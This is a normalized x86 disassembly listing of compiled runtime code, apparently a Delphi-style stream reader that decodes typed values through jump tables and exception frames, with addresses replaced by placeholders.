push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d282
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x24 ]
call sub_404600
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f44
retn
jmp [ eax * 4 + jump_table_41d010 ]
mov eax [ rw-data ]
call sub_41b954
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a84
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41be70
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bf30
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414af8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41c8e0
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_41492c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414af8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c7c4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4150cc
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d730
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414dcc
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d7ec
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ee0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d614
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414af8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41be70
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41be70
cmp al 0xd
jne r-xdata
push ebp
call sub_41ce64
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca4c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4153f8
jmp r-xdata
push ebp
call sub_41cec0
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a84
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9e0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414af8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c8e0
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41cddc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8d0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414af8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41c8e0
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8d0
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415398
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8d0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a84
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41bf88
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415398
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c8e0
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ce24
pop ecx
jmp r-xdata
sub_41d288
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f74
jmp r-xdata
mov eax [ ebx ]
call sub_417e70
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d6c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d2e8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d603
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d6d0
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41d5e1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d5a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
mov eax [ ebp - 0x1c ]
call sub_4179c8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d288
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4030d8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_417718
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d547
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405ebc
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_418314
xor eax eax
push ebp
push sub_41d527
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4184cc
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d52e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403190
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_418470
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d578
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4039d8
jmp r-xdata
call sub_403984
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41b67c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5e8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d5a7
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41b824
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403984
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5e8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403190
sub_41d614
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d6be
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d691
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d8d0
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4147fc
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41b96c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41b9a4
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d6c5
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41d6f4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41be94
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404010
mov eax esi
call j_sub_4043ec
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41be94
pop edx
pop esi
pop ebx
retn
sub_41d730
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d7dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41be70
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41d7ec
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041a8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7e4
lea eax [ ebp - 0x8 ]
call sub_404600
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d8d0
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41be94
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40456c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41be94
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41be94
jmp r-xdata
jmp r-xdata
call sub_41b96c
sub_41d7ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d8c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41be70
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d730
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40474c
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d8ca
lea eax [ ebp - 0xc ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d8d0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41be94
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404848
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41be94
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41be94
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40456c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41be94
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405b5c
jmp r-xdata
jmp r-xdata
call sub_41b96c
sub_41d8e4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d920
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d6f4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d927
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41d92c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bb2c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d9e0
mov eax [ ebx ]
call sub_41ca98
pop ebx
pop ebp
retn
sub_41d954
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41be94
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ddd8
pop ebx
pop ecx
pop ebp
retn
sub_41d984
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bb2c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41be70
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41ca98
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41ddd8
jmp r-xdata
mov eax [ ebx ]
call sub_41d9e0
mov eax [ ebx ]
call sub_41bb2c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41db7c
mov eax [ ebx ]
call sub_41ca98
sub_41d9e0
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41db6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d8d0
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db76
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
jmp [ eax * 4 + jump_table_41da17 ]
push ebp
call sub_41d92c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d954
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8e4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d954
pop ecx
jmp r-xdata
push ebp
call sub_41d984
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
push ebp
mov eax 0x2
call sub_41d954
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41ddd8
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d954
pop ecx
sub_41db7c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41dbb9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d6f4
mov eax ebx
call sub_41d9e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbc0
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41dbc4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41dc5c
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41bb2c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d6f4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41d6f4
jmp r-xdata
mov eax ebx
call sub_41db7c
mov eax ebx
call sub_41ca98
jmp r-xdata
mov eax ebx
call sub_41bb2c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41dbc4
mov eax ebx
call sub_41ca98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc63
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
sub_41dc6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dd11
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fb8
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_420c5c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd18
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
sub_41dd3c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41dd64
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41bdc4
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417908
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4033bc
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41bdc4
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41ddd8
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41be94
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41be94
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41de20
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41dfc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41b9f8
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dfa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41be94
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41a924
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41be94
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b2b4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41df7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d730
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41be94
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41a924
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41be94
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414484
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
lea eax [ ebp - 0x1c ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d204
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df86
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_41dfe8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40eeb8
mov eax [ ebp - 0x4 ]
call sub_41be70
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
jmp [ eax * 4 + jump_table_41e02a ]
mov eax [ ebp - 0x4 ]
call sub_41d8d0
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9e0
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_413048
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9e0
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_413048
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9e0
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413048
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c7c4
mov eax ebx
call sub_413240
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c808
mov eax ebx
call sub_413240
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c84c
mov eax ebx
call sub_413268
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c89c
mov eax ebx
call sub_413254
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d730
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41327c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d7ec
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4132a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8d0
cmp al 0x9
sete dl
mov eax ebx
call sub_413218
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41de20
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f1e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca4c
push edx
push eax
mov eax ebx
call sub_413144
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1e9
lea eax [ ebp - 0x1c ]
call sub_40eecc
lea eax [ ebp - 0xc ]
call sub_404600
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov eax ebx
call sub_41456c
jmp r-xdata
sub_41e1f0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_41e3bc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b2fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_41e228
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4202cc
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e250
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
